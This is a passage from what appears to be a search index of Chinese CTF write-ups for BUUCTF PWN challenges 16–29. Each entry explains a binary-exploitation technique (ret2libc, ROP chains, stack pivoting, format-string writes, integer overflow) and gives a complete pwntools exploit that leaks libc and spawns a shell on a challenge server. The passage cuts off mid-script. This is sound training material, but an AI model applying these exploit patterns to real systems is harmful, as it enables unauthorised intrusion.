<li>\u8003\u70b9\uff1a<code>\u4f2a\u968f\u673a\u6570</code>\u3001<code>\u6808\u6ea2\u51fa</code>\u3001<code>32\u4f4drop\u94fe</code>\u3001<code>ret2libc</code>\u3001<code>\\x00\u622a\u65ad</code></li> <li>\u68c0\u67e5\u4e00\u4e0b\u7a0b\u5e8f\u7684\u4fdd\u62a4\u673a\u5236</li> </ul> <ul> <li>\u9006\u5411\u7a0b\u5e8f\uff0c\u5148\u67e5\u770b\u4e00\u4e0b<code>main</code>\u51fd\u6570\uff0c\u53d1\u73b0\u6709\u4e00\u4e2a\u968f\u673a\u6570</li> </ul> <ul> <li>\u518d\u67e5\u770b\u4e00\u4e0b<code>sub_804871F()</code>\u8fd9\u4e2a\u51fd\u6570\uff0c\u53d1\u73b0\u7a0b\u5e8f\u4f1a\u5c06\u7528\u6237\u8f93\u5165\u7684\u5185\u5bb9\u4e0e\u968f\u673a\u6570\u8fdb\u884c\u6bd4\u8f83\uff0c\u6bd4\u8f83\u957f\u5ea6\u4e3a\u7528\u6237\u8f93\u5165\u7684\u5185\u5bb9\u7684\u957f\u5ea6</li> </ul> <ul> <li>\u5982\u679c\u6bd4\u8f83\u6210\u529f\u5c31\u4f1a\u8fd4\u56de<code>buf[7]</code>\uff0c\u5e76\u4e14<code>buf[7]</code>\u53ef\u4ee5\u63a7\u5236<code>sub_80487D0</code>\u8fd9\u4e2a\u51fd\u6570\uff0c\u8fd9\u6837\u5c31\u4f1a\u5bfc\u81f4\u6808\u6ea2\u51fa\u3002</li> </ul> <ul> <li>\u6240\u4ee5\u6211\u4eec\u5148\u4f7f\u7528<code>\\x00</code>\u5bf9\u7a0b\u5e8f\u8fdb\u884c\u622a\u65ad\u64cd\u4f5c\uff0c\u7136\u540e\u518d\u5411<code>but[7]</code>\u8f93\u5165\u4e00\u4e2a\u6570\uff0c\u80fd\u9020\u6210\u6ea2\u51fa\u3002\uff08\u8fd9\u6837stcncmp\u5c31\u4e0d\u4f1a\u8fdb\u884c\u5224\u65ad\uff0c\u76f4\u63a5\u8fd4\u56de0\uff09\u5c31\u53ef\u4ee5\u76f4\u63a5\u8fdb\u5165<code>\u4e0b\u4e00\u4e2a\u6808\u6ea2\u51fa\u51fd\u6570</code></li> <li>\u6700\u540e\u5c31\u76f4\u63a5\u6808\u6ea2\u51fa\uff0cexp\u5982\u4e0b\uff1a</li> </ul> <pre><code>from pwn import *\ncontext.log_level = 'debug'\nlibc = ELF('./libc-2.23.so')\np = remote('node5.buuoj.cn',25643)\n#p = process('./pwn')\npayload = b'\\x00'+b'\\xff'*0x1E\n#gdb.attach(p)\n#pause()\np.sendline(payload)\npayload = b'a'*0xE7 +b'a'*0x4 + p32(0x8048548)+p32(0x8048825)\npayload += p32(0x8049FD4)\np.sendline(payload)\np.recvuntil(b'Correct\\n')\nputs_addr = p.recvline()[:-1]\nprint('leak---&gt;',puts_addr)\nputs_addr = int.from_bytes(puts_addr,'little')\nlibc_addr = puts_addr - libc.symbols['puts']\nsys_addr = libc_addr + libc.symbols['system']\nsh_addr = libc_addr + next(libc.search(b'/bin/sh\\x00'))\n\npayload = b'\\x00'+b'\\xff'*0x1E\n#gdb.attach(p)\n#pause()\np.sendline(payload)\npayload = b'a'*0xE7 +b'a'*0x4 + p32(sys_addr)+p32(sh_addr)\npayload += p32(sh_addr)\np.sendline(payload)\np.interactive()\n</code></pre>"},{"location":"BUUCTF/PWN/1%E7%AC%AC%E4%B8%80%E9%A1%B5/#17_ciscn_2019_n_5","title":"\u9898\u76ee17_ciscn_2019_n_5","text":"<ul> <li>\u8003\u70b9\uff1a<code>\u6808\u6ea2\u51fa</code>\u3001<code>ret2libc</code>\u3001<code>\u5411bss\u6bb5\u5199\u5165/bin/sh</code></li> <li>\u4fdd\u62a4\u673a\u5236</li> </ul> <ul> <li>\u9006\u5411\u7a0b\u5e8f<code>main</code>\u51fd\u6570\uff0c\u53d1\u73b0\u7a0b\u5e8f\u5148\u4f1a\u8ba9\u7528\u6237\u8f93\u5165\u5411<code>name</code>\u8f93\u5165<code>64</code>\u5b57\u8282\uff0c\u800c<code>name</code>\u662f\u5728<code>bss</code>\u6bb5\u4e2d\u7684\u4e00\u4e2a\u5168\u5c40\u53d8\u91cf</li> <li>\u8fd8\u53d1\u73b0\u4e86<code>gets()</code>\u8fd9\u4e2a\u51fd\u6570\uff0c\u4f46\u662f\u6ca1\u6709\u53d1\u73b0<code>system()</code>\u51fd\u6570</li> </ul> <ul> <li>\u8fd9\u65f6\u6211\u4eec\u5c31\u53ef\u4ee5\u5f97\u5230\u601d\u8def\uff0c\u6211\u4eec\u5c06<code>/bin/sh</code>\u5199\u5165\u5230<code>name</code>\u4e2d\uff0c\u7136\u540e\u6b63\u5e38\u6253<code>ret2libc</code>\uff0c\u6ce8\u610f\u6808\u5bf9\u9f50</li> <li>exp\u5982\u4e0b\uff1a</li> </ul> <pre><code>from pwn import *\ncontext.log_level = 'debug'\nlibc = ELF('./libc-2.27.so')\np = remote('node5.buuoj.cn',28795)\n#p = process('./ciscn_2019_n_5')\npop_rdi = 0x400713\nputs_got = 0x601018\nputs_plt = 0x4004E0\npayload = b'a'*0x64\np.send(payload)\npayload = b'a'*0x28 + p64(pop_rdi) + p64(puts_got)\npayload+= p64(puts_plt) + p64(0x400636)\np.sendline(payload)\np.recvuntil(b'What do you want to say to me?\\n')\nputs_addr = p.recvline()[:-1]\nprint('leak--&gt;',puts_addr)\nputs_addr = int.from_bytes(puts_addr,'little')\nlibc_addr = puts_addr - libc.symbols['puts']\nsys_addr = libc_addr + libc.symbols['system']\npayload = b'/bin/sh\\x00' + b'a'*(0x64-0x8)\np.send(payload)\npayload = payload = b'a'*0x28 +p64(0x4006AA)+  p64(pop_rdi) + p64(0x601080)\npayload+= p64(sys_addr)# + p64(0x400636)\np.sendline(payload)\np.interactive()\n</code></pre>"},{"location":"BUUCTF/PWN/1%E7%AC%AC%E4%B8%80%E9%A1%B5/#18_not_the_same_3dsctf_2016","title":"\u9898\u76ee18_not_the_same_3dsctf_2016","text":"<ul> <li>\u8003\u70b9\uff1a<code>\u6808\u6ea2\u51fa</code>\u3001<code>32\u4f4d\u7a0b\u5e8f</code>\u3001<code>\u9759\u6001\u7f16\u8bd1</code>\u3001<code>ret2text</code></li> <li>\u67e5\u770b\u4fdd\u62a4\u673a\u5236</li> </ul> <ul> <li>\u9006\u5411\u7a0b\u5e8f\uff0c\u5148\u67e5\u770b<code>main</code>\u51fd\u6570\u3002\u53d1\u73b0\u7a0b\u5e8f\u5c31\u4e00\u4e2a<code>gets()</code></li> </ul> <ul> <li>\u8fd8\u53d1\u73b0\u4e86\u8fd9\u4e2a\u51fd\u6570</li> </ul> <ul> <li>\u601d\u8def\u5c31\u662f\u6808\u6ea2\u51fa\u8fd4\u56de\u5230<code>get_secret()</code>\u8fd9\u4e2a\u51fd\u6570\u4e2d\uff0c\u7136\u540e\u518d\u8c03\u7528<code>write</code>\u51fd\u6570\uff08\u4e5f\u53ef\u4ee5\u8c03\u7528printf\u51fd\u6570\u66f4\u65b9\u4fbf\uff0c\u8fd9\u91cc\u4e5f\u9009\u62e9write\u51fd\u6570\uff09\u5c06<code>flag</code>\u6253\u5370\u51fa\u6765\u3002</li> <li>\u4f46\u662f\u7ecf\u8fc7\u5c1d\u8bd5\u597d\u50cf\u4f7f\u7528<code>printf</code>\u51fd\u6570\u4f1a\u62a5\u9519\uff0c\u5177\u4f53\u539f\u56e0\u6ca1\u53bb\u67e5\u770b</li> <li>exp\u5982\u4e0b\uff1a</li> </ul> <pre><code>from pwn import *\ncontext.log_level = 'debug'\np = remote('node5.buuoj.cn',27286)\n#p = process('./not_the_same_3dsctf_2016')\npayload = b'a'*0x2d + p32(0x80489A0)\npayload+= p32(0x80489E0)\nprintf_addr = 0x804F0A0\nwrite_addr = 0x806E270\np.sendline(payload)\npayload = b'a'*0x2d  +p32(write_addr)+p32(0)\npayload += p32(0x1)+p32(0x80ECA2D) +p32(0x40)\np.sendline(payload)\np.interactive()\n</code></pre>"},{"location":"BUUCTF/PWN/1%E7%AC%AC%E4%B8%80%E9%A1%B5/#19_ciscn_2019_en_2","title":"\u9898\u76ee19_ciscn_2019_en_2","text":"<ul> <li>\u8fd9\u9898\u4e0e<code>\u9898\u76ee11_ciscn_2019_c_1</code>\u4e00\u6a21\u4e00\u6837\uff0c\u53ea\u662f\u5f02\u6216\u7684\u6570\u636e\u4e0d\u540c\uff0c\u76f4\u63a5\u7167\u6284\u8be5\u9898\u7684exp\uff0c\u5c06\u63a5\u6536\u5230\u7684<code>l</code>\u4fee\u6539\u4e3a<code>o</code>\u5373\u53ef\u3002</li> <li>exp\u5982\u4e0b\uff1a</li> </ul> <pre><code>from pwn import *\n#p = process('./ciscn_2019_c_1')\nlibc = ELF('./libc-2.27.so')\np = remote('node5.buuoj.cn',25580)\npop_rdi = 0x400c83\nret = 0x4006b9\nputs_plt = 0x4006E0\nputs_got = 0x602020\nencrypt = 0x4009A0\npayload = b'a'*0x1 + b'\\x00' + b'a'*(0x50-2)+ b'a'*0x8\npayload+= p64(ret) + p64(pop_rdi) + p64(puts_got)\npayload+= p64(puts_plt) + p64(encrypt)\np.sendline(b'1')\n#gdb.attach(p)\n#pause()\np.sendline(payload)\np.recvuntil(b'o\\n')\nleak = p.recvline()[:-1]\nprint('leak---&gt;',leak)\nputs_addr = int.from_bytes(leak,'little')\nlibc_addr = puts_addr - libc.symbols['puts']\nsys_addr = libc_addr + libc.symbols['system']\nsh_addr = libc_addr + next(libc.search(b'/bin/sh\\x00'))\npayload = b'a'*0x1 + b'\\x00' + b'a'*(0x50-2)+ b'a'*0x8\npayload+= p64(pop_rdi) + p64(sh_addr) + p64(sys_addr)\np.sendline(payload)\np.sendline(payload)\np.interactive()\n</code></pre>"},{"location":"BUUCTF/PWN/1%E7%AC%AC%E4%B8%80%E9%A1%B5/#20_ciscn_2019_ne_5","title":"\u9898\u76ee20_ciscn_2019_ne_5","text":"<ul> <li>\u8003\u70b9\uff1a</li> <li>\u67e5\u770b\u4fdd\u62a4\u673a\u5236</li> </ul> <ul> <li>\u5bf9\u7a0b\u5e8f\u8fdb\u884c\u9006\u5411\uff0c\u5148\u67e5\u770b<code>main</code>\u51fd\u6570\uff0c<code>main</code>\u51fd\u6570\u7684\u4e3b\u8981\u903b\u8f91\u5c31\u662f\u4e00\u4e2a\u83dc\u5355\u3002</li> <li>\u8fd9\u4e2a\u83dc\u5355\u524d\u9762\u4e3b\u8981\u5c31\u662f\u5b9e\u73b0\u4e00\u4e2a\u767b\u5f55\uff0c\u5e76\u4e14\u8c8c\u4f3c\u6ca1\u6709\u6808\u6ea2\u51fa\u3002</li> </ul> <ul> <li>\u67e5\u770b\u5b8c\u5404\u4e2a\u51fd\u6570\u4e4b\u540e\u53d1\u73b0\u6f0f\u6d1e\u70b9\u5728\u8fd9\u4e2a\u4f4d\u7f6e\uff0c\u8fd9\u4e2a\u4f4d\u7f6e\u4f1a\u5bfc\u81f4\u6808\u6ea2\u51fa</li> <li>\u4f46\u662f\u8981\u6ce8\u610f<code>strcpy</code>\u9047\u5230<code>\\x00</code>\u8fd9\u4e2a\u5b57\u7b26\u4e32\u540e\u4f1a\u88ab\u622a\u65ad\u3002</li> </ul> <ul> <li>\u800c\u6211\u4eec\u7684<code>src</code>\u662f\u901a\u8fc7\u8fd9\u4e2a\u5730\u65b9\u6765\u5199\u5165\u7684</li> </ul> <ul> <li>\u8fd8\u53d1\u73b0\u8fd9\u8fb9\u6709\u4e2a<code>system()</code>\u51fd\u6570</li> </ul> <ul> <li>\u6b64\u65f6\u6211\u4eec\u5c31\u53ef\u4ee5\u901a\u8fc7\u6ea2\u51fa\u6784\u9020rop\u94fe\uff0c\u540c\u65f6\u5199\u5165<code>/bin/sh</code>\u5230\u7a0b\u5e8f\u7684<code>bss</code>\u6bb5\u4e2d\u5373\u53ef\uff0c\u4f46\u662f\u8fd9\u91cc\u6ca1\u6709<code>read</code>\u51fd\u6570\uff0c\u4e0d\u597d\u5199<code>/bin/sh</code>\u5230<code>bss</code>\u6bb5</li> <li>\u8fd9\u8fb9\u5c31\u76f4\u63a5\u91c7\u53d6\u6cc4\u9732\u7684\u601d\u8def\uff0c\u6ce8\u610f<code>scanf()</code>\u8fd9\u4e2a\u51fd\u6570\u6709\u4ee5\u4e0b\u5751\u70b9</li> </ul> <ul> <li>\u5e76\u4e14\u4e0d\u77e5\u9053\u600e\u4e48\u56de\u4e8b\u7a0b\u5e8f\u4e0d\u884c<code>getshell</code>\uff0c\u6700\u7ec8\u53d1\u73b0\u597d\u50cf\u662f<code>libc</code>\u9519\u4e86</li> </ul> <ul> <li>exp\u5982\u4e0b\uff1a</li> </ul> <pre><code>from numpy import put\nfrom pwn import *\n#p = process('./ciscn_2019_ne_5')\nlibc = ELF('./libc-2.27.so')\np = remote('node5.buuoj.cn',25991)\np.sendline(b'administrator')\np.sendline(b'1')\nputs_got = 0x804A020\nputs_plt = 0x80484C0\nmain_addr = 0x8048722\nprintf_got = 0x804A014\npayload = b'a'*(0x48+0x4)\npayload += p32(puts_plt)+ p32(main_addr) + p32(printf_got)\np.sendline(payload)\n\np.sendline(b'4')\np.recvuntil(b'aaaaaa')\np.recvline()\nprintf_addr = p.recvline()[:4]\nprint('leak---&gt;',printf_addr)\nprintf_addr = int.from_bytes(printf_addr,'little')\nlibc_addr = printf_addr - libc.symbols['printf']\nsh_addr = libc_addr + next(libc.search(b'/bin/sh\\x00'))\np.sendline(b'administrator')\np.sendline(b'1')\npayload = b'a'*(0x48+0x4)\npayload += p32(0x80486B9) + p32(sh_addr)\np.sendline(payload)\np.sendline(b'4')\np.interactive()\n</code></pre>"},{"location":"BUUCTF/PWN/1%E7%AC%AC%E4%B8%80%E9%A1%B5/#21___2018_rop","title":"\u9898\u76ee21_\u94c1\u4eba\u4e09\u9879(\u7b2c\u4e94\u8d5b\u533a)__2018_rop","text":"<ul> <li>\u8003\u70b9\uff1a<code>\u6808\u6ea2\u51fa</code>\u3001<code>ret2libc</code></li> <li>\u67e5\u770b\u4fdd\u62a4\u673a\u5236</li> </ul> <ul> <li>\u9006\u5411\u7a0b\u5e8f\uff0c\u5148\u67e5\u770b<code>main</code>\u51fd\u6570\uff0c\u53d1\u73b0<code>main</code>\u51fd\u6570\u5c31\u8c03\u7528\u4e86\u8fd9\u4fe9\u4e2a\u51fd\u6570</li> </ul> <ul> <li>\u518d\u6765\u67e5\u770b<code>be_nice_to_people()</code>\uff0c\u53d1\u73b0\u6ca1\u5565\u6f0f\u6d1e</li> </ul> <ul> <li>\u63a5\u4e0b\u53bb\u7ee7\u7eed\u770b<code>vulnerable_function()</code>\uff0c\u53d1\u73b0\u5b58\u5728\u6808\u6ea2\u51fa</li> <li>\u7ee7\u7eed\u67e5\u627e\u597d\u6ca1\u6709\u770b\u5230<code>system</code>\u548c<code>/bin/sh</code>\u8fd9\u4e2a\u5b57\u7b26\u4e32\uff0c\u6240\u4ee5\u6253<code>ret2libc</code></li> </ul> <ul> <li>exp\u5982\u4e0b\uff1a</li> </ul> <pre><code>from os import system\nfrom numpy import put\nfrom pwn import *\n#p = process('./2018_rop')\nlibc = ELF('./libc-2.27.so')\np = remote('node5.buuoj.cn',29708)\nwrite_got = 0x804A010\nwrite_plt = 0x80483A0\npayload = b'a'*0x88 + b'a'*0x4\npayload += p32(write_plt)+ p32(0x8048474) + p32(1) + p32(write_got)\npayload += p32(0x0)\np.sendline(payload)\npayload = b'a'*0x88 + b'a'*0x4\npayload += p32(write_plt)+ p32(0x8048474) + p32(1) + p32(write_got)\npayload += p32(0x8)\np.sendline(payload)\nwrite_addr = p.recv()[:4]\nwrite_addr = int.from_bytes(write_addr,'little')\nlibc_addr = write_addr - libc.symbols['write']\nsys_addr = libc_addr + libc.symbols['system']\nsh_addr = libc_addr + next(libc.search(b'/bin/sh\\x00'))\npayload = b'a'*0x88 + b'a'*0x4\npayload += p32(sys_addr)+ p32(0x8048474) + p32(sh_addr)\np.sendline(payload)\np.interactive()\n</code></pre>"},{"location":"BUUCTF/PWN/1%E7%AC%AC%E4%B8%80%E9%A1%B5/#22_bjdctf_2020_babystack2","title":"\u9898\u76ee22_bjdctf_2020_babystack2","text":"<ul> <li>\u8003\u70b9\uff1a<code>\u6574\u6570\u6ea2\u51fa</code>\u3001<code>\u6808\u6ea2\u51fa</code>\u3001<code>ret2text</code></li> <li>\u68c0\u67e5\u4e00\u4e0b\u4fdd\u62a4\u673a\u5236</li> </ul> <ul> <li>\u9006\u5411\u7a0b\u5e8f\uff0c\u5148\u67e5\u770b<code>main</code>\u51fd\u6570\uff0c\u53d1\u73b0\u662f\u4e00\u4e2a\u6574\u6570\u6ea2\u51fa</li> </ul> <ul> <li> <p>\u76f4\u63a5\u8f93\u5165<code>-1</code>\uff0c\u7ed5\u8fc7\u68c0\u67e5\uff0c\u7ed5\u8fc7\u4e4b\u540e\u76f4\u63a5\u6808\u6ea2\u51fa</p> </li> <li> <p>\u8fd8\u53d1\u73b0\u4e86\u540e\u95e8\u51fd\u6570</p> </li> </ul> <p></p> <ul> <li>exp\u5982\u4e0b\uff0c\u6253\u7684\u65f6\u5019\u6ce8\u610f\u6808\u5bf9\u9f50\uff1a</li> </ul> <pre><code>from pwn import *\n#p = process('./bjdctf_2020_babystack2')\nlibc = ELF('./libc-2.27.so')\np = remote('node5.buuoj.cn',27593)\np.sendline(b'-1')\npayload = b'a'*0x18 + p64(0x40072A)\np.sendline(payload)\np.interactive()\n</code></pre> <p></p>"},{"location":"BUUCTF/PWN/1%E7%AC%AC%E4%B8%80%E9%A1%B5/#23_jarvisoj_fm","title":"\u9898\u76ee23_jarvisoj_fm","text":"<ul> <li>\u8003\u70b9\uff1a<code>\u5b57\u7b26\u4e32\u683c\u5f0f\u5316\u6f0f\u6d1e</code>\u3001<code>\u7b80\u5355%n\u7684\u4f7f\u7528</code></li> <li>\u68c0\u67e5\u4fdd\u62a4\u673a\u5236</li> </ul> <ul> <li>\u9006\u5411\u7a0b\u5e8f\uff0c\u5148\u67e5\u770b\u4e00\u4e0b<code>main</code>\u51fd\u6570\uff0c\u4e3b\u8981\u6f0f\u6d1e\u51fa\u73b0\u5728\u8fd9\u91cc\uff0c\u8fd9\u91cc\u76f4\u63a5\u4f7f\u7528<code>%n</code>\u4fee\u6539\u53d8\u91cf<code>x</code></li> <li><code>x</code>\u5728bss\u6bb5\u4e0a\uff0c\u6240\u4ee5\u6211\u4eec\u8fd8\u9700\u8981\u5148\u5199\u5165<code>x</code>\u7684\u5730\u5740\u3002\u7136\u540e\u786e\u5b9a\u504f\u79fb</li> </ul> <ul> <li>\u63a5\u4e0b\u6765\u52a8\u8c03\u786e\u5b9a\u504f\u79fb<code>%11$p</code></li> <li> <p>\u7136\u540e\u4f7f\u7528<code>%11$lln</code>\u76f4\u63a5\u4fee\u6539</p> </li> <li> <p>\u63a5\u4e0b\u6765\u5c31\u76f4\u63a5\u5199exp\u6253</p> </li> </ul> <pre><code>from pwn import *\n#p = process('./fm')\nlibc = ELF('./libc-2.27.so')\np = remote('node5.buuoj.cn',28823)\npayload =  p32(0x804A02C) + b'%11$lln'\np.sendline(payload)\np.interactive()\n</code></pre> <p></p>"},{"location":"BUUCTF/PWN/1%E7%AC%AC%E4%B8%80%E9%A1%B5/#24_bjdctf_2020_babyrop","title":"\u9898\u76ee24_bjdctf_2020_babyrop","text":"<ul> <li>\u8003\u70b9\uff1a<code>64\u4f4dret2libc</code></li> <li>\u4fdd\u62a4\u673a\u5236</li> </ul> <ul> <li>\u9006\u5411\u7a0b\u5e8f\uff0c\u5148\u67e5\u770b<code>main</code>\u51fd\u6570</li> </ul> <ul> <li>\u518d\u67e5\u770b<code>vuln</code>\u8fd9\u4e2a\u51fd\u6570\uff0c\u5c31\u4f1a\u53d1\u73b0\u8fd9\u4e2a\u51fd\u6570\u5b58\u5728\u6808\u6ea2\u51fa</li> </ul> <ul> <li>\u76f4\u63a5<code>ret2libc</code>\uff0cexp\u5982\u4e0b\uff1a</li> </ul> <pre><code>from pwn import *\n#p = process('./bjdctf_2020_babyrop')\nlibc = ELF('./libc-2.23.so')\np = remote('node5.buuoj.cn',26685)\npop_rdi = 0x400733\nputs_got = 0x601018\nputs_plt = 0x4004E0\npayload = b'a'*0x20 + b'a'*0x8\npayload += p64(pop_rdi)\npayload += p64(puts_got)\npayload += p64(puts_plt)\npayload += p64(0x4006AD)\np.sendline(payload)\np.recvuntil(b'Pull up your sword and tell me u story!\\n')\nputs_addr = p.recvline()[:-1]\nprint('leak--&gt;',puts_addr)\nputs_addr = int.from_bytes(puts_addr,'little')\nlibc_addr = puts_addr - libc.symbols['puts']\nsys_addr = libc_addr + libc.symbols['system']\nsh_addr = libc_addr + next(libc.search(b'/bin/sh\\x00'))\npayload = b'a'*0x20 + b'a'*0x8\npayload += p64(0x4006CB)\npayload += p64(pop_rdi)\npayload += p64(sh_addr)\npayload += p64(sys_addr)\npayload += p64(0x4006AD)\np.sendline(payload)\np.interactive()\n</code></pre>"},{"location":"BUUCTF/PWN/1%E7%AC%AC%E4%B8%80%E9%A1%B5/#25_jarvisoj_tell_me_something","title":"\u9898\u76ee25_jarvisoj_tell_me_something","text":"<ul> <li>\u8003\u70b9\uff1a<code>ret2text</code></li> <li>\u68c0\u67e5\u4fdd\u62a4\u673a\u5236</li> </ul> <ul> <li>\u9006\u5411\u7a0b\u5e8f\uff0c\u5148\u67e5\u770b<code>main</code>\u51fd\u6570\uff0c\u8fd9\u8fb9\u5b58\u5728\u4e00\u4e2a\u6808\u6ea2\u51fa</li> </ul> <ul> <li>\u53d1\u73b0\u8fd9\u8fb9\u4f1a\u8f93\u51fa<code>flag</code></li> </ul> <ul> <li>\u76f4\u63a5\u5199<code>exp</code>\uff1a</li> </ul> <pre><code>from pwn import *\n#p = process('./guestbook')\nlibc = ELF('./libc-2.23.so')\np = remote('node5.buuoj.cn',25255)\npayload = b'a'*0x88\npayload += p64(0x400620)\np.sendline(payload)\np.interactive()\n</code></pre>"},{"location":"BUUCTF/PWN/1%E7%AC%AC%E4%B8%80%E9%A1%B5/#26_ciscn_2019_es_2","title":"\u9898\u76ee26_ciscn_2019_es_2","text":"<ul> <li>\u8003\u70b9\uff1a<code>\u6808\u6ea2\u51fa</code>\u3001<code>\u6808\u8fc1\u79fb</code></li> <li>\u5148\u68c0\u67e5\u4e00\u4e0b\u4fdd\u62a4\u673a\u5236</li> </ul> <ul> <li>\u9006\u5411\u7a0b\u5e8f\uff0c\u5148\u67e5\u770b\u4e00\u4e0b<code>main</code>\u51fd\u6570</li> </ul> <ul> <li>\u76f4\u63a5\u67e5\u770b<code>vuln</code>\u51fd\u6570\uff0c\u53d1\u73b0\u5b58\u5728\u6808\u6ea2\u51fa\uff0c\u4f46\u662f\u6ea2\u51fa\u592a\u5c11\u5b57\u8282\u4e86\uff0c\u6240\u4ee5\u9700\u8981\u6808\u8fc1\u79fb</li> </ul> <ul> <li>\u5e76\u4e14\u6709<code>system</code>\u8fd9\u4e2a\u51fd\u6570</li> </ul> <ul> <li>\u4f46\u662f\u6ca1\u6709<code>/bin/sh</code>\u8fd9\u4e2a\u5b57\u7b26\u4e32\uff0c\u6240\u4ee5\u6211\u4eec\u9700\u8981\u5c06\u8fd9\u4e2a\u5b57\u7b26\u4e32\u5199\u5165\u5230<code>bss</code>\u6bb5\u4e2d</li> <li>exp\u5982\u4e0b\uff1a</li> </ul> <pre><code>from pwn import *\n#p = process('./ciscn_2019_es_2')\n#libc = ELF('./libc-2.23.so')\np = remote('node5.buuoj.cn',29357)\nbss_addr = 0x804A040+0x700\np.sendline(b'1')\npayload = b'a'*0x28\npayload += p32(bss_addr)\npayload += p32(0x80485D8)\np.send(payload)\npayload = b'/bin/sh\\x00' + p32(0x8048559) \npayload += p32(bss_addr-0x10)\npayload += p32(0x8048559)+p32(bss_addr-0x28)+ b'/bin/sh\\x00'*0x2\npayload += p32(bss_addr-0x28+0x4)\npayload += p32(0x80485FD)\np.send(payload)\np.interactive()\n</code></pre>"},{"location":"BUUCTF/PWN/1%E7%AC%AC%E4%B8%80%E9%A1%B5/#27_harekazectf2019baby_rop2","title":"\u9898\u76ee27_[HarekazeCTF2019]baby_rop2","text":"<ul> <li>\u8003\u70b9\uff1a<code>\u7b80\u5355ret2libc</code></li> <li>\u68c0\u67e5\u4fdd\u62a4\u673a\u5236</li> </ul> <ul> <li>\u9006\u5411\u7a0b\u5e8f\u5148\u4ece<code>main</code>\u51fd\u6570\u5f00\u59cb\uff0c\u53d1\u73b0\u5b58\u5728\u6808\u6ea2\u51fa\u6f0f\u6d1e</li> </ul> <ul> <li>\u76f4\u63a5\u6253<code>ret2libc</code></li> <li>exp\u5982\u4e0b\uff1a</li> </ul> <pre><code>from pwn import *\ncontext.log_level = 'debug'\n#p = process('./babyrop2')\nlibc = ELF('./libc-2.23.so')\np = remote('node5.buuoj.cn',28306)\npop_rdi = 0x400733\nprintf_got = 0x601018\nprintf_plt = 0x4004F0\nread_got = 0x601020\npayload = b'z'*0x1c\npayload += p32(0x1)\npayload += p64(0x4006CB)\npayload += p64(0x4006CB)\npayload += p64(pop_rdi)\npayload += p64(read_got)\npayload += p64(printf_plt)\npayload += p64(0x400636)\np.sendline(payload)\np.recvuntil(b'zzzzzzzzzzzzzzzzzzzzzzzzzzzzQ!\\n')\nprintf_addr = p.recv()[:6]\nprint('leak---&gt;',printf_addr)\nprintf_addr = int.from_bytes(printf_addr,'little')\nlibc_addr = printf_addr - libc.symbols['read']\nsys_addr = libc_addr + libc.symbols['system']\nsh_addr = libc_addr + next(libc.search(b'/bin/sh\\x00'))\npayload = b'z'*0x1c\npayload += p32(0x1)\npayload += p64(0x4006CB)\npayload += p64(pop_rdi)\npayload += p64(sh_addr)\npayload += p64(sys_addr)\npayload += p64(0x400636)\np.sendline(payload)\np.interactive()\n</code></pre>"},{"location":"BUUCTF/PWN/1%E7%AC%AC%E4%B8%80%E9%A1%B5/#28_picoctf_2018_rop-chain","title":"\u9898\u76ee28_picoctf_2018_rop chain","text":"<ul> <li>\u8003\u70b9\uff1a<code>32\u4f4d\u53c2\u6570\u8c03\u7528</code></li> <li>\u67e5\u770b\u4fdd\u62a4\u673a\u5236</li> </ul> <ul> <li>\u9006\u5411\u5206\u6790\u7a0b\u5e8f\uff0c\u5148\u67e5\u770b<code>main</code>\u51fd\u6570</li> </ul> <ul> <li>\u76f4\u63a5\u67e5\u770b<code>vuln</code>\u8fd9\u4e2a\u51fd\u6570\uff0c\u53d1\u73b0<code>gets()</code>\u51fd\u6570\uff0c\u76f4\u63a5\u6808\u6ea2\u51fa</li> </ul> <ul> <li>\u53d1\u73b0\u8fd9\u8fb9\u53ef\u4ee5\u5f97\u5230flag\uff0c\u4f46\u662f\u8981\u6ee1\u8db3\u6761\u4ef6</li> </ul> <ul> <li>\u53d1\u73b0\u8fd8\u6709\u4fe9\u4e2a\u5730\u65b9</li> </ul> <ul> <li>\u76f4\u63a5\u5c31\u662f\u4e00\u6b65\u4e00\u6b65\u6784\u9020<code>32\u4f4drop\u94fe</code></li> <li>exp\u5982\u4e0b\uff1a</li> </ul> <pre><code>from pwn import *\ncontext.log_level = 'debug'\n#p = process('./PicoCTF_2018_rop_chain')\nlibc = ELF('./libc-2.23.so')\np = remote('node5.buuoj.cn',29128)\nwin1 = 0x80485CB\nwin2 = 0x80485D8\nvuln = 0x8048714\npayload = b'a'*0x1c\npayload += p32(win1)+p32(vuln)\np.sendline(payload)\npayload = b'a'*0x1c\npayload += p32(win2)+p32(vuln)+p32(0xBAAAAAAD)\np.sendline(payload)\npayload = b'a'*0x1c\npayload += p32(0x804862B)+p32(vuln)+p32(0xDEADBAAD)\np.sendline(payload)\np.interactive()\n</code></pre>"},{"location":"BUUCTF/PWN/1%E7%AC%AC%E4%B8%80%E9%A1%B5/#29_pwn2_sctf_2016","title":"\u9898\u76ee29_pwn2_sctf_2016","text":"<ul> <li>\u8003\u70b9\uff1a<code>\u6574\u6570\u6ea2\u51fa</code>\u3001<code>ret2libc</code>\u3001<code>ret2syscall</code></li> <li>\u67e5\u770b\u4fdd\u62a4\u673a\u5236</li> </ul> <ul> <li>\u9006\u5411\u5206\u6790\u8fd9\u4e2a\u7a0b\u5e8f\uff0c\u6211\u4eec\u5148\u6765\u67e5\u770b\u4e00\u4e0b<code>main</code>\u51fd\u6570</li> </ul> <ul> <li>\u76f4\u63a5\u67e5\u770b<code>vuln</code>\u8fd9\u4e2a\u51fd\u6570\uff0c\u53d1\u73b0\u5b58\u5728\u6574\u6570\u6ea2\u51fa\uff0c\u95f4\u63a5\u5bfc\u81f4\u6808\u6ea2\u51fa</li> </ul> <ul> <li>\u8fd8\u53d1\u73b0\u6709\u7cfb\u7edf\u8c03\u7528\uff0c\u8fd9\u91cc\u5c31\u4e0d\u6253<code>int 0x80</code>\uff0c\u76f4\u63a5\u6253<code>ret2libc</code></li> </ul> <ul> <li>exp\u5982\u4e0b\uff1a</li> </ul> <pre><code>from pwn import *\ncontext.log_level = 'debug'\n#p = process('./pwn2_sctf_2016')\nlibc = ELF('./libc-2.23.so')\np = remote('node5.buuoj.cn',29664)\nprintf_got = 0x0804A00C\nprintf_plt = 0x08048370\nvulin = 0x804852F\np.sendline(b'-1')\npayload = b'a'*0x30\npayload += p32(printf_plt)+p32(vulin)+p32(printf_got)\np.sendline(payload)\np.recvuntil(b'You said: aaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaap\\x83\\x04\\x08/\\x85\\x04\\x08\\x0c\\xa0\\x04\\x08\\n')\n#printf_addr = p.recvline()#[:4]\nprintf_addr = 